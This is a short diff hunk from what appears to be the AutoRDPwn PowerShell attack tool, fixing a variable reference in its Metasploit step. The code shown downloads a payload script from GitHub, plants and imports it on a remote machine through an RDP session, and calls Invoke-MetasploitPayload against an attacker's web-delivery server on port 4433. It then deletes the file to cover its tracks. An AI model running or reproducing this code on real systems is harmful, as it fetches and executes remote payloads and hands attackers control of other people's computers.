@@ -556,7 +556,7 @@ Write-Host "--------------------------------------------------------------------
 invoke-command -session $RDP[0] -scriptblock ${function:Start-WebServer}}
 
 if ($metasploit){ $metascript = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-MetasploitPayload.ps1')
-invoke-command -session $RDP[0] -scriptblock { Set-Content -Value $using:$metascript -Path Invoke-MetasploitPayload.ps1 ; Import-Module .\Invoke-MetasploitPayload.ps1 ; Write-Host
+invoke-command -session $RDP[0] -scriptblock { Set-Content -Value $using:metascript -Path Invoke-MetasploitPayload.ps1 ; Import-Module .\Invoke-MetasploitPayload.ps1 ; Write-Host
 Write-Host "==================== Metasploit Web Delivery =========================" -ForegroundColor Gray
 Invoke-MetasploitPayload "http://$using:metaserver`:4433/$using:metarandom" -verbose
 Write-Host "======================================================================" -ForegroundColor Gray ; Write-Host ; Start-Sleep -milliseconds 7500 ; del .\Invoke-MetasploitPayload.ps1 }}
